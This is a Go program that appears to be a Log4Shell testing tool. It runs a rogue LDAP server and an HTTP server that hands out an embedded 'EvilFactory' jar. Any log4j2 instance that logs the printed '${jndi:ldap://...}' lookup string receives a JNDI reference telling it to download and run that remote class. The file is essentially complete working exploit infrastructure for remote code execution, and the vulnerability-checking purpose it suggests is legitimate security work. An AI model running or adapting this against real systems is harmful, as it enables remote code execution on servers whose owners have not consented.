package main

import (
	"embed"
	"fmt"
	"github.com/logrusorgru/aurora"
	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"reflect"
	"strings"
	"syscall"
	"unsafe"
)

//go:embed evilfactory-1.0-SNAPSHOT.jar
//go:embed index.html
var jar embed.FS

func main() {
	printIpAddresses()
	printUsage()
	ldapServer := startLdapServer()
	startHttpServer()

	ch := make(chan os.Signal)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)
	ldapServer.Stop()
}

func printUsage() {
	fmt.Println("Try to make log4j2 to print ${jndi:ldap://<IP>:1389/probably_not_vulnerable}")
	fmt.Println("Example: ")
	fmt.Println("----")
	fmt.Println(aurora.Blue(`package info.jerrinot.log4shell.test;

import org.apache.logging.log4j.LogManager;

public class Main {
    public static void main(String[] args) throws Exception {
        LogManager.getLogger(Main.class).fatal("${jndi:ldap://172.17.0.2:1389/probably_not_vulnerable}");
    }
}`))
	fmt.Println("----")
	fmt.Printf("Running inside container: %t\n", isRunningInDockerContainer())
}

func startLdapServer() *ldap.Server {
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Search(handleSearch)
	routes.Bind(handleBind)
	server.Handle(routes)
	go func() {
		err := server.ListenAndServe("0.0.0.0:1389")
		if err != nil {
			panic(err)
		}
	}()
	return server
}

func printIpAddresses() {
	fmt.Printf("Listening on following IP addresses: ")
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		panic(err)
	}
	for _, addr := range addrs {
		address := strings.Split(addr.String(), "/")[0]
		if address != "127.0.0.1" && !strings.Contains(address, "::") {
			fmt.Println(address)
		}
	}
}

func isRunningInDockerContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}
	return false
}

func startHttpServer() {
	var staticFS = http.FS(jar)
	fs := http.FileServer(staticFS)
	http.Handle("/", fs)
	go func() {
		err := http.ListenAndServe(":3000", nil)
		if err != nil {
			panic(err)
		}
	}()
}

func getOwnAddress(m *ldap.Message) string {
	foo := m.Client
	rs := reflect.ValueOf(foo).Elem()
	rf := rs.Field(2)
	rf = reflect.NewAt(rf.Type(), unsafe.Pointer(rf.UnsafeAddr())).Elem()
	con := rf.Interface().(net.Conn)
	return strings.Split(con.LocalAddr().String(), ":")[0]
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	select {
	case <-m.Done:
		log.Print("Leaving handleSearch...")
		return
	default:
	}

	codebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/evilfactory-1.0-SNAPSHOT.jar", getOwnAddress(m)))
	e := ldap.NewSearchResultEntry("cn=pwned, " + string(r.BaseObject()))
	e.AddAttribute("cn", "pwned")
	e.AddAttribute("javaClassName", "probably vulnerable")
	e.AddAttribute("javaCodeBase", codebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", "info.jerrinot.log4shell.evilfactory.EvilFactory")
	w.Write(e)

	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
